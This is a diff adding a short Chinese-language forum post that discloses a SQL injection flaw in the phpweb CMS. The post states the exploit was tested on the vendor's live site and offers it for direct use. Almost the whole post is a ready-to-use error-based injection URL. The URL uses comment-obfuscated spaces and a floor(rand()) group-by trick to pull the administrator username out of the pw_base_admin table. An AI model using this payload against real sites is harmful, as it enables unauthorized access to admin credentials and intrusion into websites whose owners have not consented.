@@ -1,0 +1,12 @@
+
+[【原创】] phpweb注入漏洞
+ 
+
+
+
+phpweb注入漏洞
+ by qingsh4n@90sec
+ blog:http://hi.baidu.com/new/qingsh4n
+ 
+程序是lostwolf那个帖子下载的，也不知道是不是最新版本。不知道之前有没有人发，但是官网测试有效。直接看利用：
+ http://www.xxxx.net/news/html/?510'/**/and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e,0x27,pw_base_admin.user,0x27,0x7e)/**/from/**/pw_base_admin/**/limit/**/0,1))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)/**/and/**/'1'='1.html
